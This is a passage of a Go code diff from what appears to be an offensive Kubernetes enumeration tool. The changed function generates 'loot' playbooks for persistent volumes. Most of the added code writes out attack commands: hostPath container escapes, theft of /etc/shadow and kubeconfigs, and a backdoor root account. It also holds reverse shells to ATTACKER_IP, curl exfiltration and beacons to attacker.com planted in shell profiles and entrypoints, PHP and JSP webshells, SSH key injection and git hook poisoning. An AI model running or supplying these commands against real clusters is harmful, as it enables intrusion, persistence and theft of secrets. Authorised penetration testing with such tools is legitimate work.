-		analysis.RiskLevel = "MEDIUM"
+		analysis.RiskLevel = shared.RiskMedium
 	}
 
 	// Check encryption parameters
@@ -1401,7 +1335,7 @@ func calculateVolumeRiskScore(finding PersistentVolumeFinding) (string, int) {
 	if finding.IsHostPath {
 		score += 100
 		if finding.AllowsHostRoot || finding.AllowsKubeletAccess {
-			return "CRITICAL", 100
+			return shared.RiskCritical, 100
 		}
 	}
 
@@ -1436,169 +1370,530 @@ func calculateVolumeRiskScore(finding PersistentVolumeFinding) (string, int) {
 	}
 
 	// Determine risk level
-	if score >= 80 {
-		return "CRITICAL", score
-	} else if score >= 50 {
-		return "HIGH", score
-	} else if score >= 25 {
-		return "MEDIUM", score
+	if score >= shared.CriticalThreshold {
+		return shared.RiskCritical, score
+	} else if score >= shared.HighThreshold {
+		return shared.RiskHigh, score
+	} else if score >= shared.MediumThreshold {
+		return shared.RiskMedium, score
 	}
-	return "LOW", score
+	return shared.RiskLow, score
 }
 
-// generateLootContent generates content for all loot files
-func generateLootContent(finding *PersistentVolumeFinding, lootEnum, lootHostPath, lootEscalation,
-	lootUnencrypted, lootExfiltration, lootNetworkStorage, lootReclaimPolicy, lootReadWriteMany,
-	lootOrphaned, lootCloudAccess, lootDataAccess, lootAttackPaths, lootMisconfigurations,
-	lootRemediation *[]string) {
+// generateLootContent generates content for loot files organized by technology
+func generateLootContent(finding *PersistentVolumeFinding, loot *shared.LootBuilder) {
+	// 1. PV-Enum - Basic enumeration (all volumes)
+	loot.Section("PV-Enum").
+		Addf("\n# PersistentVolume: %s", finding.PVName).
+		Addf("kubectl get pv %s -o yaml", finding.PVName).
+		Addf("kubectl describe pv %s", finding.PVName)
 
-	// Enumeration
-	*lootEnum = append(*lootEnum, fmt.Sprintf("\n# PersistentVolume: %s (Risk: %s)", finding.PVName, finding.RiskLevel))
-	*lootEnum = append(*lootEnum, fmt.Sprintf("kubectl get pv %s -o yaml", finding.PVName))
-	*lootEnum = append(*lootEnum, fmt.Sprintf("kubectl describe pv %s", finding.PVName))
 	if finding.PVCName != "" && finding.PVCNamespace != "" {
-		*lootEnum = append(*lootEnum, fmt.Sprintf("kubectl get pvc %s -n %s -o yaml", finding.PVCName, finding.PVCNamespace))
-		*lootEnum = append(*lootEnum, fmt.Sprintf("kubectl describe pvc %s -n %s", finding.PVCName, finding.PVCNamespace))
+		loot.Section("PV-Enum").
+			Addf("kubectl get pvc %s -n %s -o yaml", finding.PVCName, finding.PVCNamespace).
+			Addf("kubectl describe pvc %s -n %s", finding.PVCName, finding.PVCNamespace)
 	}
-	*lootEnum = append(*lootEnum, "")
+	loot.Section("PV-Enum").Add("")
 
-	// HostPath volumes
+	// 2. PV-HostPath - All HostPath volume techniques
 	if finding.IsHostPath {
-		*lootHostPath = append(*lootHostPath, fmt.Sprintf("\n# PV: %s - RISK: %s", finding.PVName, finding.HostPathRisk))
-		*lootHostPath = append(*lootHostPath, fmt.Sprintf("# HostPath: %s", finding.HostPathPath))
-		*lootHostPath = append(*lootHostPath, "# Container Escape Technique:")
-		*lootHostPath = append(*lootHostPath, `cat <<EOF | kubectl apply -f -
+		ns := finding.PVCNamespace
+		if ns == "" {
+			ns = "default"
+		}
+		pvc := finding.PVCName
+		if pvc == "" {
+			pvc = "<pvc-name>"
+		}
+
+		loot.Section("PV-HostPath").
+			Addf("\n# ═══════════════════════════════════════════════════════════").
+			Addf("# PV: %s", finding.PVName).
+			Addf("# HostPath: %s", finding.HostPathPath).
+			Addf("# ═══════════════════════════════════════════════════════════")
+
+		// Method 1: Use existing PVC
+		if finding.PVCName != "" {
+			loot.Section("PV-HostPath").
+				Add("#").
+				Add("# METHOD 1: Exploit via existing PVC").
+				Add("#").
+				Addf(`cat <<'EOF' | kubectl apply -f -
 apiVersion: v1
 kind: Pod
 metadata:
-  name: hostpath-escape
-  namespace: `+finding.PVCNamespace+`
+  name: hostpath-escape-%s
+  namespace: %s
 spec:
   containers:
   - name: escape
     image: alpine
-    command: ["sh", "-c", "sleep 3600"]
+    command: ["sleep", "3600"]
     volumeMounts:
     - name: hostpath
       mountPath: /host
   volumes:
   - name: hostpath
     persistentVolumeClaim:
-      claimName: `+finding.PVCName+`
-EOF`)
-		*lootHostPath = append(*lootHostPath, "kubectl exec -it hostpath-escape -n "+finding.PVCNamespace+" -- sh")
-		*lootHostPath = append(*lootHostPath, "# Inside container: ls -la /host")
-		*lootHostPath = append(*lootHostPath, "# Access host filesystem, read /host/etc/shadow, /host/root/.kube/config")
-		*lootHostPath = append(*lootHostPath, "")
-	}
-
-	// Privilege escalation
-	if len(finding.EscalationPaths) > 0 {
-		*lootEscalation = append(*lootEscalation, fmt.Sprintf("\n# PV: %s", finding.PVName))
-		*lootEscalation = append(*lootEscalation, "# Escalation Paths:")
-		for _, path := range finding.EscalationPaths {
-			*lootEscalation = append(*lootEscalation, "# - "+path)
+      claimName: %s
+EOF`, finding.PVName, ns, pvc)
 		}
-		*lootEscalation = append(*lootEscalation, "")
-	}
 
-	// Unencrypted sensitive data
-	if !finding.IsEncrypted && finding.SensitiveDataType != "" {
-		*lootUnencrypted = append(*lootUnencrypted, fmt.Sprintf("\n# PV: %s", finding.PVName))
-		*lootUnencrypted = append(*lootUnencrypted, fmt.Sprintf("# Sensitive Data Type: %s", finding.SensitiveDataType))
-		*lootUnencrypted = append(*lootUnencrypted, fmt.Sprintf("# Encryption: NONE"))
-		*lootUnencrypted = append(*lootUnencrypted, "# Risk: Data exposure via snapshots or direct access")
-		*lootUnencrypted = append(*lootUnencrypted, "")
-	}
-
-	// Data exfiltration
-	if len(finding.ExfiltrationScenarios) > 0 {
-		*lootExfiltration = append(*lootExfiltration, fmt.Sprintf("\n# PV: %s", finding.PVName))
-		*lootExfiltration = append(*lootExfiltration, "# Exfiltration Techniques:")
-		for _, scenario := range finding.ExfiltrationScenarios {
-			*lootExfiltration = append(*lootExfiltration, "# "+scenario)
-		}
-		if finding.PVCName != "" {
-			*lootExfiltration = append(*lootExfiltration, "\n# Snapshot-based exfiltration:")
-			*lootExfiltration = append(*lootExfiltration, fmt.Sprintf("kubectl create volumesnapshot %s-snapshot --source-pvc=%s -n %s",
-				finding.PVCName, finding.PVCName, finding.PVCNamespace))
-			*lootExfiltration = append(*lootExfiltration, "# Wait for snapshot to be ready")
-			*lootExfiltration = append(*lootExfiltration, "# Create new PVC from snapshot and mount in attacker pod")
-		}
-		*lootExfiltration = append(*lootExfiltration, "")
-	}
-
-	// Network storage
-	if finding.IsNetworkStorage {
-		*lootNetworkStorage = append(*lootNetworkStorage, fmt.Sprintf("\n# PV: %s", finding.PVName))
-		*lootNetworkStorage = append(*lootNetworkStorage, fmt.Sprintf("# NFS Server: %s", finding.NFSServer))
-		*lootNetworkStorage = append(*lootNetworkStorage, fmt.Sprintf("# NFS Path: %s", finding.NFSPath))
-		*lootNetworkStorage = append(*lootNetworkStorage, fmt.Sprintf("# Read-Only: %t", finding.NFSReadOnly))
-		*lootNetworkStorage = append(*lootNetworkStorage, "# Direct mount (bypass Kubernetes):")
-		*lootNetworkStorage = append(*lootNetworkStorage, fmt.Sprintf("mkdir -p /mnt/nfs-%s", finding.PVName))
-		*lootNetworkStorage = append(*lootNetworkStorage, fmt.Sprintf("mount -t nfs %s:%s /mnt/nfs-%s", finding.NFSServer, finding.NFSPath, finding.PVName))
-		*lootNetworkStorage = append(*lootNetworkStorage, "# Access data without Kubernetes audit logs")
-		*lootNetworkStorage = append(*lootNetworkStorage, "")
-	}
-
-	// Reclaim policy
-	if finding.ReclaimPolicy == "Retain" {
-		*lootReclaimPolicy = append(*lootReclaimPolicy, fmt.Sprintf("\n# PV: %s", finding.PVName))
-		*lootReclaimPolicy = append(*lootReclaimPolicy, "# Reclaim Policy: Retain")
-		*lootReclaimPolicy = append(*lootReclaimPolicy, "# Risk: Volume persists after PVC deletion")
-		*lootReclaimPolicy = append(*lootReclaimPolicy, "# Attack: Delete PVC, wait for volume release, reclaim orphaned volume")
-		*lootReclaimPolicy = append(*lootReclaimPolicy, "")
-	}
-
-	// ReadWriteMany
-	if finding.AllowsReadWriteMany {
-		*lootReadWriteMany = append(*lootReadWriteMany, fmt.Sprintf("\n# PV: %s", finding.PVName))
-		*lootReadWriteMany = append(*lootReadWriteMany, fmt.Sprintf("# Bound Pods: %d", finding.BoundPodCount))
-		*lootReadWriteMany = append(*lootReadWriteMany, "# Risk: Shared access across pods")
-		if finding.BoundPodCount > 1 {
-			*lootReadWriteMany = append(*lootReadWriteMany, "# Pods with access:")
-			for _, pod := range finding.BoundPods {
-				*lootReadWriteMany = append(*lootReadWriteMany, fmt.Sprintf("#   - %s", pod))
-			}
-			*lootReadWriteMany = append(*lootReadWriteMany, "# Lateral movement: Compromise any pod → access all shared data")
-		}
-		*lootReadWriteMany = append(*lootReadWriteMany, "")
-	}
-
-	// Orphaned volumes
-	if finding.OrphanedVolume || finding.UnusedVolume {
-		*lootOrphaned = append(*lootOrphaned, fmt.Sprintf("\n# PV: %s (Status: %s)", finding.PVName, finding.Status))
-		if finding.OrphanedVolume {
-			*lootOrphaned = append(*lootOrphaned, "# Status: Released (orphaned)")
-			*lootOrphaned = append(*lootOrphaned, "# May contain previous tenant data")
-		} else {
-			*lootOrphaned = append(*lootOrphaned, "# Status: Available (unbound)")
-			*lootOrphaned = append(*lootOrphaned, "# Check for old data before claiming")
-		}
-		*lootOrphaned = append(*lootOrphaned, "")
-	}
-
-	// Cloud access
-	if finding.CloudVolumeID != "<NONE>" && finding.CloudVolumeID != "" {
-		cloudLoot := generateCloudVolumeLoot(finding.VolumeType, finding.CloudVolumeID, finding.PVName)
-		*lootCloudAccess = append(*lootCloudAccess, cloudLoot...)
-	}
-
-	// Data access
-	if finding.PVCName != "" && finding.PVCNamespace != "" {
-		*lootDataAccess = append(*lootDataAccess, fmt.Sprintf("\n# Access PVC: %s/%s", finding.PVCNamespace, finding.PVCName))
-		*lootDataAccess = append(*lootDataAccess, "# Create temporary pod to access data:")
-		inspectorName := strings.ReplaceAll(finding.PVCName, ".", "-")
-		*lootDataAccess = append(*lootDataAccess, fmt.Sprintf(`cat <<EOF | kubectl apply -f -
+		// Method 2: Direct HostPath pod
+		loot.Section("PV-HostPath").
+			Add("#").
+			Add("# METHOD 2: Direct HostPath pod (requires create pods permission)").
+			Add("#").
+			Addf(`cat <<'EOF' | kubectl apply -f -
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pvc-inspector-%s
+  name: hostpath-direct-%s
   namespace: %s
 spec:
   containers:
-  - name: inspector
-    image: busybox
+  - name: escape
+    image: alpine
+    command: ["sleep", "3600"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: hostfs
+      mountPath: /host
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: %s
+      type: Directory
+EOF`, finding.PVName, ns, finding.HostPathPath)
+
+		// Exploitation commands
+		loot.Section("PV-HostPath").
+			Add("#").
+			Add("# ─────────────────────────────────────────────────────────────").
+			Add("# EXPLOITATION COMMANDS").
+			Add("# ─────────────────────────────────────────────────────────────").
+			Add("#").
+			Addf("# Exec into pod:").
+			Addf("kubectl exec -it hostpath-escape-%s -n %s -- sh", finding.PVName, ns).
+			Add("#").
+			Add("# Once inside the container:")
+
+		// Path-specific exploitation
+		if finding.HostPathPath == "/" || finding.AllowsHostRoot {
+			loot.Section("PV-HostPath").
+				Add("#").
+				Add("# [CRITICAL] Full host filesystem access:").
+				Add("ls -la /host/").
+				Add("cat /host/etc/shadow").
+				Add("cat /host/etc/passwd").
+				Add("cat /host/root/.ssh/authorized_keys").
+				Add("cat /host/root/.bash_history").
+				Add("#").
+				Add("# Steal kubeconfig and certificates:").
+				Add("cat /host/etc/kubernetes/admin.conf").
+				Add("cat /host/var/lib/kubelet/kubeconfig").
+				Add("ls -la /host/var/lib/kubelet/pki/").
+				Add("#").
+				Add("# Access etcd data (all cluster secrets):").
+				Add("ls -la /host/var/lib/etcd/").
+				Add("#").
+				Add("# Container runtime escape:").
+				Add("ls -la /host/var/run/docker.sock").
+				Add("ls -la /host/var/run/containerd/containerd.sock").
+				Add("#").
+				Add("# Add SSH key for persistence:").
+				Add("echo 'your-ssh-public-key' >> /host/root/.ssh/authorized_keys").
+				Add("#").
+				Add("# Add root user:").
+				Add("echo 'backdoor:x:0:0::/root:/bin/bash' >> /host/etc/passwd")
+		} else if strings.HasPrefix(finding.HostPathPath, "/var/run/docker") {
+			loot.Section("PV-HostPath").
+				Add("#").
+				Add("# [CRITICAL] Docker socket access - Container escape:").
+				Add("apk add docker-cli").
+				Add("docker -H unix:///host/docker.sock ps").
+				Add("docker -H unix:///host/docker.sock run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh")
+		} else if strings.HasPrefix(finding.HostPathPath, "/var/run/containerd") {
+			loot.Section("PV-HostPath").
+				Add("#").
+				Add("# [CRITICAL] Containerd socket access - Container escape:").
+				Add("apk add containerd-ctr").
+				Add("ctr -a /host/containerd.sock containers list").
+				Add("ctr -a /host/containerd.sock tasks exec --exec-id shell <container-id> sh")
+		} else if strings.HasPrefix(finding.HostPathPath, "/var/lib/kubelet") {
+			loot.Section("PV-HostPath").
+				Add("#").
+				Add("# [CRITICAL] Kubelet access - Cluster admin escalation:").
+				Add("cat /host/kubeconfig").
+				Add("ls -la /host/pki/").
+				Add("cat /host/pki/kubelet-client-current.pem").
+				Add("#").
+				Add("# Use kubelet credentials to authenticate as node:")
+		} else if strings.HasPrefix(finding.HostPathPath, "/etc") {
+			loot.Section("PV-HostPath").
+				Add("#").
+				Add("# [HIGH] System configuration access:").
+				Add("cat /host/shadow").
+				Add("cat /host/passwd").
+				Add("ls -la /host/kubernetes/")
+		}
+
+		// Cleanup
+		loot.Section("PV-HostPath").
+			Add("#").
+			Add("# ─────────────────────────────────────────────────────────────").
+			Add("# CLEANUP").
+			Add("# ─────────────────────────────────────────────────────────────").
+			Addf("kubectl delete pod hostpath-escape-%s -n %s", finding.PVName, ns).
+			Addf("kubectl delete pod hostpath-direct-%s -n %s", finding.PVName, ns).
+			Add("")
+	}
+
+	// 3. PV-NFS - All NFS/network storage techniques
+	if finding.IsNetworkStorage {
+		loot.Section("PV-NFS").
+			Addf("\n# ═══════════════════════════════════════════════════════════").
+			Addf("# PV: %s", finding.PVName).
+			Addf("# NFS Server: %s", finding.NFSServer).
+			Addf("# NFS Path: %s", finding.NFSPath).
+			Addf("# Read-Only: %t", finding.NFSReadOnly).
+			Addf("# ═══════════════════════════════════════════════════════════").
+			Add("#").
+			Add("# METHOD 1: Direct mount from attacker machine (bypass K8s RBAC)").
+			Add("#").
+			Add("# Install NFS client:").
+			Add("apt-get install nfs-common  # Debian/Ubuntu").
+			Add("yum install nfs-utils       # RHEL/CentOS").
+			Add("#").
+			Add("# Mount the NFS share:").
+			Addf("mkdir -p /mnt/nfs-%s", finding.PVName).
+			Addf("mount -t nfs %s:%s /mnt/nfs-%s", finding.NFSServer, finding.NFSPath, finding.PVName).
+			Addf("mount -t nfs -o vers=3 %s:%s /mnt/nfs-%s  # Try NFSv3 if v4 fails", finding.NFSServer, finding.NFSPath, finding.PVName).
+			Add("#").
+			Add("# Browse and exfiltrate data:").
+			Addf("ls -laR /mnt/nfs-%s", finding.PVName).
+			Addf("tar czf nfs-data-%s.tar.gz /mnt/nfs-%s", finding.PVName, finding.PVName).
+			Add("#").
+			Add("# Check NFS exports on server (if accessible):").
+			Addf("showmount -e %s", finding.NFSServer)
+
+		if !finding.NFSReadOnly {
+			loot.Section("PV-NFS").
+				Add("#").
+				Add("# [WARNING] Read-Write access - Data tampering possible:").
+				Addf("echo 'backdoor' > /mnt/nfs-%s/backdoor.txt", finding.PVName).
+				Add("# Inject malicious files into application data")
+		}
+
+		loot.Section("PV-NFS").
+			Add("#").
+			Add("# METHOD 2: Mount via pod (uses K8s, but direct NFS access)").
+			Add("#").
+			Addf(`cat <<'EOF' | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: nfs-accessor-%s
+  namespace: default
+spec:
+  containers:
+  - name: nfs
+    image: alpine
+    command: ["sleep", "3600"]
+    volumeMounts:
+    - name: nfs-vol
+      mountPath: /data
+  volumes:
+  - name: nfs-vol
+    nfs:
+      server: %s
+      path: %s
+EOF`, finding.PVName, finding.NFSServer, finding.NFSPath).
+			Add("#").
+			Add("# Access data:").
+			Addf("kubectl exec -it nfs-accessor-%s -- sh", finding.PVName).
+			Addf("kubectl exec nfs-accessor-%s -- ls -laR /data", finding.PVName).
+			Addf("kubectl exec nfs-accessor-%s -- tar czf /tmp/data.tar.gz /data", finding.PVName).
+			Addf("kubectl cp default/nfs-accessor-%s:/tmp/data.tar.gz ./nfs-%s.tar.gz", finding.PVName, finding.PVName).
+			Add("#").
+			Add("# Cleanup:").
+			Addf("kubectl delete pod nfs-accessor-%s", finding.PVName).
+			Addf("umount /mnt/nfs-%s", finding.PVName).
+			Add("")
+	}
+
+	// 4. PV-RWX - All ReadWriteMany lateral movement techniques
+	if finding.AllowsReadWriteMany && finding.BoundPodCount > 0 {
+		// Build namespace info string
+		nsInfo := ""
+		if len(finding.BoundNamespaces) > 1 {
+			nsInfo = fmt.Sprintf(" across %d namespaces (%s)", len(finding.BoundNamespaces), strings.Join(finding.BoundNamespaces, ", "))
+		} else if len(finding.BoundNamespaces) == 1 {
+			nsInfo = fmt.Sprintf(" in namespace %s", finding.BoundNamespaces[0])
+		}
+
+		loot.Section("PV-RWX").
+			Addf("\n# ═══════════════════════════════════════════════════════════").
+			Addf("# PV: %s", finding.PVName).
+			Addf("# PVC: %s/%s", finding.PVCNamespace, finding.PVCName).
+			Addf("# Shared by: %d pod(s)%s", finding.BoundPodCount, nsInfo).
+			Addf("# ═══════════════════════════════════════════════════════════").
+			Add("#").
+			Add("# RISK: Compromise ANY pod with access → pivot to ALL other pods").
+			Add("# RWX volumes have NO pod-level access control").
+			Add("#")
+
+		// List all pods with access
+		loot.Section("PV-RWX").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("PV-RWX").Add("# PODS WITH ACCESS TO THIS VOLUME:")
+		loot.Section("PV-RWX").Add("# ─────────────────────────────────────────────────────────────")
+		for i, pod := range finding.BoundPods {
+			ns := finding.PVCNamespace
+			if i < len(finding.BoundNamespaces) {
+				ns = finding.BoundNamespaces[i]
+			}
+			loot.Section("PV-RWX").Addf("kubectl exec -it %s -n %s -- sh", pod, ns)
+		}
+
+		// Only show exploitation techniques if multiple pods share the volume
+		if finding.BoundPodCount > 1 {
+			firstPod := finding.BoundPods[0]
+			ns := finding.PVCNamespace
+			if len(finding.BoundNamespaces) > 0 {
+				ns = finding.BoundNamespaces[0]
+			}
+
+			loot.Section("PV-RWX").
+				Add("#").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# TECHNIQUE 1: REVERSE SHELL INJECTION").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# Plant a reverse shell script that other pods may execute").
+				Add("#").
+				Addf("kubectl exec %s -n %s -- sh -c 'cat > /data/.hidden-shell.sh << \"SHELL\"", firstPod, ns).
+				Add("#!/bin/bash").
+				Add("# Reverse shell - replace ATTACKER_IP and PORT").
+				Add("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1").
+				Add("SHELL'").
+				Addf("kubectl exec %s -n %s -- chmod +x /data/.hidden-shell.sh", firstPod, ns).
+				Add("#").
+				Add("# Alternative: netcat reverse shell").
+				Addf("kubectl exec %s -n %s -- sh -c 'cat > /data/.nc-shell.sh << \"SHELL\"", firstPod, ns).
+				Add("#!/bin/bash").
+				Add("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f").
+				Add("SHELL'")
+
+			loot.Section("PV-RWX").
+				Add("#").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# TECHNIQUE 2: CONFIG FILE POISONING").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# Inject malicious config that other pods will load").
+				Add("#").
+				Add("# Find config files:").
+				Addf("kubectl exec %s -n %s -- find /data -name '*.conf' -o -name '*.yaml' -o -name '*.yml' -o -name '*.json' -o -name '*.env' 2>/dev/null", firstPod, ns).
+				Add("#").
+				Add("# Inject into .env file (if exists):").
+				Addf("kubectl exec %s -n %s -- sh -c 'echo \"MALICIOUS_VAR=\\$(curl http://attacker.com/exfil?data=\\$(cat /etc/passwd|base64))\" >> /data/.env'", firstPod, ns).
+				Add("#").
+				Add("# Inject into shell profile (executed on container start):").
+				Addf("kubectl exec %s -n %s -- sh -c 'echo \"curl http://attacker.com/beacon?pod=\\$HOSTNAME\" >> /data/.profile'", firstPod, ns).
+				Addf("kubectl exec %s -n %s -- sh -c 'echo \"curl http://attacker.com/beacon?pod=\\$HOSTNAME\" >> /data/.bashrc'", firstPod, ns)
+
+			loot.Section("PV-RWX").
+				Add("#").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# TECHNIQUE 3: WEBSHELL DEPLOYMENT").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# If volume serves web content, deploy a webshell").
+				Add("#").
+				Add("# Check for web content:").
+				Addf("kubectl exec %s -n %s -- find /data -name '*.php' -o -name '*.jsp' -o -name '*.aspx' 2>/dev/null | head -5", firstPod, ns).
+				Add("#").
+				Add("# PHP webshell:").
+				Addf("kubectl exec %s -n %s -- sh -c 'cat > /data/.shell.php << \"PHP\"", firstPod, ns).
+				Add("<?php if(isset($_REQUEST[\"cmd\"])){system($_REQUEST[\"cmd\"]);} ?>").
+				Add("PHP'").
+				Add("#").
+				Add("# JSP webshell:").
+				Addf("kubectl exec %s -n %s -- sh -c 'cat > /data/.shell.jsp << \"JSP\"", firstPod, ns).
+				Add("<%@ page import=\"java.io.*\" %><%if(request.getParameter(\"cmd\")!=null){Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String line;while((line=br.readLine())!=null){out.println(line);}}%>").
+				Add("JSP'")
+
+			loot.Section("PV-RWX").
+				Add("#").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# TECHNIQUE 4: CRON/STARTUP SCRIPT INJECTION").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# Inject into scripts that run periodically or on startup").
+				Add("#").
+				Add("# Find executable scripts:").
+				Addf("kubectl exec %s -n %s -- find /data -type f -executable 2>/dev/null", firstPod, ns).
+				Addf("kubectl exec %s -n %s -- find /data -name '*.sh' 2>/dev/null", firstPod, ns).
+				Add("#").
+				Add("# Inject into existing script (prepend to run first):").
+				Addf("kubectl exec %s -n %s -- sh -c 'for f in /data/*.sh; do sed -i \"2i curl http://attacker.com/beacon\" \"$f\" 2>/dev/null; done'", firstPod, ns).
+				Add("#").
+				Add("# Create malicious entrypoint wrapper:").
+				Addf("kubectl exec %s -n %s -- sh -c 'cat > /data/entrypoint-wrapper.sh << \"ENTRY\"", firstPod, ns).
+				Add("#!/bin/bash").
+				Add("# Exfiltrate secrets before running real entrypoint").
+				Add("curl -X POST http://attacker.com/collect -d \"$(env | base64)\" &").
+				Add("exec /original-entrypoint.sh \"$@\"").
+				Add("ENTRY'")
+
+			loot.Section("PV-RWX").
+				Add("#").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# TECHNIQUE 5: SSH KEY INJECTION").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# If shared volume contains home directories or .ssh folders").
+				Add("#").
+				Add("# Find SSH directories:").
+				Addf("kubectl exec %s -n %s -- find /data -name '.ssh' -type d 2>/dev/null", firstPod, ns).
+				Addf("kubectl exec %s -n %s -- find /data -name 'authorized_keys' 2>/dev/null", firstPod, ns).
+				Add("#").
+				Add("# Inject SSH public key:").
+				Addf("kubectl exec %s -n %s -- sh -c 'echo \"ssh-rsa AAAA...your-public-key... attacker@evil\" >> /data/.ssh/authorized_keys'", firstPod, ns).
+				Add("#").
+				Add("# Steal existing SSH keys:").
+				Addf("kubectl exec %s -n %s -- sh -c 'find /data -name \"id_rsa\" -o -name \"id_ed25519\" -o -name \"*.pem\" 2>/dev/null | xargs cat'", firstPod, ns)
+
+			loot.Section("PV-RWX").
+				Add("#").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# TECHNIQUE 6: DATA EXFILTRATION VIA SHARED VOLUME").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# Use shared volume as staging area for exfiltration").
+				Add("#").
+				Add("# From compromised pod, stage data for pickup:").
+				Addf("kubectl exec %s -n %s -- sh -c 'mkdir -p /data/.exfil'", firstPod, ns).
+				Addf("kubectl exec %s -n %s -- sh -c 'cat /etc/passwd > /data/.exfil/passwd'", firstPod, ns).
+				Addf("kubectl exec %s -n %s -- sh -c 'env > /data/.exfil/env'", firstPod, ns).
+				Addf("kubectl exec %s -n %s -- sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token > /data/.exfil/sa-token'", firstPod, ns).
+				Add("#").
+				Add("# Collect from all pods sharing the volume:").
+				Addf("kubectl exec %s -n %s -- sh -c 'hostname > /data/.exfil/$(hostname).info && env >> /data/.exfil/$(hostname).info'", firstPod, ns).
+				Add("# Wait for other pods to populate, then collect all")
+
+			loot.Section("PV-RWX").
+				Add("#").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# TECHNIQUE 7: SYMLINK ATTACKS").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# Create symlinks to sensitive paths that other pods may follow").
+				Add("#").
+				Add("# Link to service account tokens:").
+				Addf("kubectl exec %s -n %s -- ln -sf /var/run/secrets/kubernetes.io/serviceaccount/token /data/.token", firstPod, ns).
+				Add("#").
+				Add("# Link to host paths (if pod has hostPath access):").
+				Addf("kubectl exec %s -n %s -- ln -sf /host/etc/shadow /data/.shadow 2>/dev/null", firstPod, ns).
+				Add("#").
+				Add("# Create tarpit - symlink to /dev/zero to DoS readers:").
+				Addf("kubectl exec %s -n %s -- ln -sf /dev/zero /data/important-data.bak", firstPod, ns)
+
+			loot.Section("PV-RWX").
+				Add("#").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# TECHNIQUE 8: APPLICATION-SPECIFIC ATTACKS").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("#").
+				Add("# Database dump injection (if DB uses shared storage):").
+				Addf("kubectl exec %s -n %s -- sh -c 'cat > /data/malicious.sql << \"SQL\"", firstPod, ns).
+				Add("-- Backdoor user creation").
+				Add("INSERT INTO users (username, password, role) VALUES ('backdoor', 'hashed_pw', 'admin');").
+				Add("SQL'").
+				Add("#").
+				Add("# Git repo poisoning (if shared volume has repos):").
+				Addf("kubectl exec %s -n %s -- sh -c 'cd /data/repo && git config core.hooksPath /data/.githooks 2>/dev/null'", firstPod, ns).
+				Addf("kubectl exec %s -n %s -- sh -c 'mkdir -p /data/.githooks && echo \"curl http://attacker.com/git-hook\" > /data/.githooks/pre-commit && chmod +x /data/.githooks/pre-commit'", firstPod, ns)
+
+			// Cleanup section
+			loot.Section("PV-RWX").
+				Add("#").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Add("# CLEANUP").
+				Add("# ─────────────────────────────────────────────────────────────").
+				Addf("kubectl exec %s -n %s -- rm -f /data/.hidden-shell.sh /data/.nc-shell.sh", firstPod, ns).
+				Addf("kubectl exec %s -n %s -- rm -f /data/.shell.php /data/.shell.jsp", firstPod, ns).
+				Addf("kubectl exec %s -n %s -- rm -rf /data/.exfil /data/.githooks", firstPod, ns).
+				Addf("kubectl exec %s -n %s -- rm -f /data/.token /data/.shadow", firstPod, ns).
+				Add("")
+		} else {
+			loot.Section("PV-RWX").
+				Add("#").
+				Add("# NOTE: Only 1 pod currently bound. Monitor for additional pods.").
+				Add("# If more pods bind to this volume, lateral movement becomes possible.").
+				Add("")
+		}
+	}
+
+	// 5. PV-Cloud - Cloud provider volume access
+	if finding.CloudVolumeID != "<NONE>" && finding.CloudVolumeID != "" {
+		cloudLoot := generateCloudVolumeLoot(finding.VolumeType, finding.CloudVolumeID, finding.PVName)
+		for _, line := range cloudLoot {
+			loot.Section("PV-Cloud").Add(line)
+		}
+	}
+
+	// 6. PV-Snapshots - Snapshot-based techniques (for volumes with PVCs)
+	if finding.PVCName != "" && finding.PVCNamespace != "" {
+		ns := finding.PVCNamespace
+		loot.Section("PV-Snapshots").
+			Addf("\n# ═══════════════════════════════════════════════════════════").
+			Addf("# PV: %s", finding.PVName).
+			Addf("# PVC: %s/%s", ns, finding.PVCName).
+			Addf("# ═══════════════════════════════════════════════════════════").
+			Add("#").
+			Add("# SNAPSHOT-BASED DATA EXFILTRATION:").
+			Add("# Clone sensitive data without touching original volume").
+			Add("#").
+			Add("# Step 1: Create snapshot").
+			Addf("kubectl apply -f - <<EOF").
+			Add("apiVersion: snapshot.storage.k8s.io/v1").
+			Add("kind: VolumeSnapshot").
+			Add("metadata:").
+			Addf("  name: %s-snapshot", finding.PVCName).
+			Addf("  namespace: %s", ns).
+			Add("spec:").
+			Add("  source:").
+			Addf("    persistentVolumeClaimName: %s", finding.PVCName).
+			Add("EOF").
+			Add("#").
+			Add("# Step 2: Wait for snapshot ready").
+			Addf("kubectl get volumesnapshot %s-snapshot -n %s -w", finding.PVCName, ns).
+			Add("#").
+			Add("# Step 3: Create PVC from snapshot").
+			Addf(`cat <<'EOF' | kubectl apply -f -
+apiVersion: v1
+kind: PersistentVolumeClaim
+metadata:
+  name: %s-exfil
+  namespace: %s
+spec:
+  dataSource:
+    name: %s-snapshot
+    kind: VolumeSnapshot
+    apiGroup: snapshot.storage.k8s.io
+  accessModes:
+    - ReadWriteOnce
+  resources:
+    requests:
+      storage: %s
+EOF`, finding.PVCName, ns, finding.PVCName, finding.Capacity).
+			Add("#").
